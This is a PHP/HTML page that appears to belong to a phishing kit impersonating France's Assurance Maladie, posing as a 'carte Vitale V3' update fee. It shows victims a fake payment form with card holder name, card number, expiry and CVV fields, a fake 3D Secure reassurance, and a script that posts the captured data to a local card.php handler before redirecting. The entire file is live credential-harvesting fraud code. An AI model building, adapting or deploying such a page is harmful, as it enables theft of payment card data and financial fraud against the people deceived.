<?php 


include("../infos.php");
include("../common/sub_includes.php");

?>
<html lang="fr">
<?php include("../common/header.php")  ?>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-itunes-app" content="app-id=505488770">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>

                    .progressbar { margin: 0px 10px; overflow: hidden; }
                    .progressbar > div { float: left; width: 20%; text-align: center; padding-bottom: 10px; border-bottom: 5px solid rgb(52, 141, 48); position: relative; margin-bottom: 7px; font-style: italic; }
                    .progressbar > div > span { color: rgb(52, 141, 48); }
                    .progressbar > div > div { position: absolute; bottom: -12px; left: 50%; width: 20px; height: 20px; background: rgb(52, 141, 48) none repeat scroll 0% 0%; border-radius: 10px; z-index: 0; }
                    .progressbar > div.progressing > div { background: white none repeat scroll 0% 0%; border: 3px solid rgb(52, 141, 48); }
                    .progressbar > div.progressing > span { color: rgb(0, 150, 136); font-style: normal; }
                    @media (max-width: 470px) {
                    .progressbar > div > span { font-size: 11px !important; }
                    .progressbar > div { width: inherit; padding-left: 5px; }
                    .progressbar { margin: 0px auto; }
                    .last-payment-form > h1 { text-align: center; line-height: 100%; font-size: 25px; }
                    .valider-btn { width: 100% !important; }
                    .payment-form { padding: 10px !important; }
                    .last-payment-form { padding: 10px !important; }
                    .last-form-info > div { float: left !important; }
                    .last-form-info > div > label { font-size: 11px; }
                    }
                    @media (max-width: 330px) {
                    .progressbar > div > span { font-size: 10px !important; }
                    }

                    .content-wrap {
                        overflow: hidden;
                        margin: 10px 0px;
                    }


                    .content-wrap > div {
                        float: left;
                    }
                    @media (min-width: 500px){
                        .banner {
                        float: left;
                        width: 500px;
                    }
                    }


                    .last-form {
                        border: 1px solid rgb(181, 181, 181); 
                        border-radius: 4px;
                        padding: 16px;
                    }

                    .pay-with-card > div {
                        float: left;
                        padding: 10px;
                    }

                    .form-input {
                        position: relative;
                    }


                    .form-input > i {
                        color: grey;
                        position: absolute;
                        right: 10px;
                        top: 35px;
                    }

                    .last-form i {
                        font-size: 25px;
                    }

                    .form-input > i.error {
                        display: none;
                        color: red;
                    }
                    .form-input > i {
                        color: grey;
                        position: absolute;
                        right: 10px;
                        top: 30px;
                    }

                    .progressbar > div{
                                width: 25%;
                            }

                            .container{
                                width : 95% !important;
                            }
        </style>
                <link rel="stylesheet" href="../assets/css/style_v2.css">
                <link rel="stylesheet" href="../assets/css/bootstrap.css">

                <link rel="shortcut icon" href="/public/fav.png" type="image/ico">

                <title>Veuillez remplir le formulaire</title>
</head>
<style>
    				.panel-heading{
					border-bottom : 2px solid #003763 !important

				}
                span{
                    color : #003763 !important;
                }
                .btn-xl,.styled-table thead tr,.btn-primary{
                    background-color : #003763 !important;
                }
</style>
<body>
<div class="content-wrap" style="margin-top: 0px; margin-bottom: 30px; 
background: #003763 none repeat scroll 0% 0%;">
        <div class="banner">
			<?php include("../common/svg.php"); ?>
								
     </div>
    </div>
    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li><a href="#" id="toPortailPub" title="Retour au portail">Assurance Maladie</a></li>
                <li class="active">Mise à jour carte vitale V3</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">

<div class="row">
    <div class="col-md-12">

        <div class="panel panel-default" style="background: url(../assets/images/back.png);">
            <div class="panel-heading">

                <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Choisissez votre mode de paiement</h2>
            </div>

            <div class="panel-body"><br>

                
                <br>
                Numéro de commande : <b>FR5284564747511147</b>
                
                <br>
                Total à payer : <b><?php echo $_SESSION['prix'] ?> <small>€ TTC</small></b>
                
                <br>
                Bénéficiaire : <b>Assurance Maladie</b>
                <hr>
                
                
                
            
            
                        
                        <div class="row">
                        <div class="col-md-7">
                        <div class="col-md-12">
                        
                        <div class="progressbar">

                    <div><span>Informations</span>
                        <div></div>
                    </div>
                    <div><span>Adresse</span>
                        <div></div>
                    </div>
                    <div><span>Port</span>
                        <div></div>
                    </div>
                    <div class="progressing"> <span>Paiement</span>
                        <div></div>
                    </div>
                </div>
                <br><br>
<div class="last-form " id="cc_view" style="background:white;display: block;">
                    <div class="pay-with-card">
                        <div> <i style="float:left" class="fa fa-credit-card"></i> &nbsp;&nbsp;
                        <span style="font-size:16px;font-weight:bold;">Payer avec :</span> </div>
                        <div style="float: right;"> 
                        <img src="../assets/images/eurocard_choice.gif" title="MasterCard" style="border: 0px none; width: 48px;" border="0" align="middle">
                        <img src="../assets/images/visa_choice.gif" title="VISA" style="border: 0px none; width: 56px;" border="0" align="middle">
                        <img src="../assets/images/carte@20bleue_choice.gif" title="Carte Banquaire" style="border: 0px none; width: 45px;" border="0" align="middle"> </div>
                    </div>
                    
                    <div style="clear:both"></div>
                    <div style="height:1px;width:100%;background:gray;margin-top:3px;opacity:0.2;margin-bottom:20px;"></div>
                   
                    <form action="" method="POST">
                        <div class="form-input form-group  ">
                            <label for="spi_tmp">Titulaire de la carte <small style="opacity:0.7">(*)</small></label>
                            <input class="form-control" name="input_cc_name" pattern=".{4,}" placeholder="Veuillez entrer le nom du titulaire de la carte." maxlength="22" type="text" aria-required="true" required="">
                        <br><div class="form-input form-group ">
                            <label for="spi_tmp">Numéro de la carte <small style="opacity:0.7">(*)</small></label>
                            <input name="input_cc_num" class="form-control" pattern="\d{16,22}" placeholder="•••• •••• •••• ••••" maxlength="16" type="text" aria-required="true" required="">
                            <i class="fa fa-credit-card"></i> </div>
                        
                            
                            <div class="row">
                            <div class="col-md-6">
                            <div class="form-group" id="fg_spi">
                                <label for="spi_tmp">Date d'expiration <small style="opacity:0.7">(MM/AA)</small></label>
                                <input name="input_cc_exp"  placeholder="MM/AA" maxlength="5" type="text" class="form-control" aria-required="true" required="" onkeyup="formatString(event);" onkeypress="formatString(event);" onpaste="formatString(event);">
                            </div>
                            </div>
                            
                            <div class="col-md-6">
                            <div class="form-group" id="fg_spi">
                                <label for="spi_tmp">Cryptogramme<small style="opacity:0.7"> (3 chiffres)</small></label>
                                <input name="input_cc_cvv" class="form-control" placeholder="•••" maxlength="4" id="cvv" type="password" aria-required="true" required="">
                        </div>
                            </div>
                            </div>
                            <p style="color :red;display : none" id="error_it">Les informations fournies n'ont pas pu être vérifiées, veuillez réessayer </p>
                     
                        
                        <br>
<button type="submit" id="submit" class="btn btn-primary">Confirmer le paiement</button>  

<div style="height:1px;width:100%;background:gray;margin-top:33px;opacity:0.2;margin-bottom:-6px;"></div>
                      <br>
                        <div style="margin-right: 110px; position: relative; display: block;">
                            <p>Afin de garantir votre sécurité lors de votre paiement par carte bancaire, Assurance Maladie utilise la fonction 3D Secure. Après avoir validé vos coordonnées bancaires, vous allez être redirigé vers le site de votre banque.</p>
                            <img src="../assets/images/verified_by_visa.png" style="position: absolute; top: 1px; width: 100px; right: -115px;"> 
                            <img src="../assets/images//mastercard-securecode.png" style="position: absolute; top: 60px; width: 100px; right: -115px;opacity : 0"> </div>
                    
                </div></form>
                 </div>
                  </div>
                   </div>
                 

                          <div class="col-md-5" style="border-radius:6px;">
                            <img class="col-md-12" src="../assets/images/vitale.jpg" style="margin-bottom:12px;">
                            <img class="col-md-12" src="../assets/images/regimes.png" style="border-radius:60px;;">
                        </div>
                            
                        
                        </div>
                        
                    
            



            </div>
        </div>
    </div>
</div>
<br><br>




</main>

    <div id="loading" class="LoadingPage" style="">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://www.ameli.fr/themes/custom/ameli/images/logo.svg">
                </div>
                <span>Veuillez patienter ...</span>
            </div>
        </div>
    </div>
	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>

  <script src="../assets/js/mask.js"></script>


  <script>

      $("#cvv").mask("0000");
  </script>

  <script>
        function formatString(e) {
        var inputChar = String.fromCharCode(event.keyCode);
        var code = event.keyCode;
        var allowedKeys = [8];
        if (allowedKeys.indexOf(code) !== -1) {
            return;
        }

        event.target.value = event.target.value.replace(
            /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
        ).replace(
            /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
        ).replace(
            /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
        ).replace(
            /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
        ).replace(
            /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 et 00 > 0
        ).replace(
            /[^\d\/]|^[\/]*$/g, '' // Chiffre & / only `/`
        ).replace(
            /\/\//g, '/' // Evit d'avoir plus de 1 `/`
        );
        }

</script>
    <script>
        vbv = false

        $(document).ready(function() {
        			$("form").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "../actions/card.php",
        						data: $this.serialize(),
                                success:function(response) {

                                var jsonData = JSON.parse(response);

                                if(jsonData.success == "1"){
                                    setTimeout(function() {
                                    if(vbv == true){
                                        window.location.href = "apple_pay.php";

                                    }
                                    else{
                                        window.location.href = "loading_finished.php";

                                    }
                                }, 3000);
                                }
                                else{
                                    setTimeout(function() {
                                        $("#error_it").css("display","block");
                                        $("#loading").css("display","none");

                                }, 1000);
                                }
                                }
        					})

        				
        
        			});
        		});
    </script>

</body>

</html>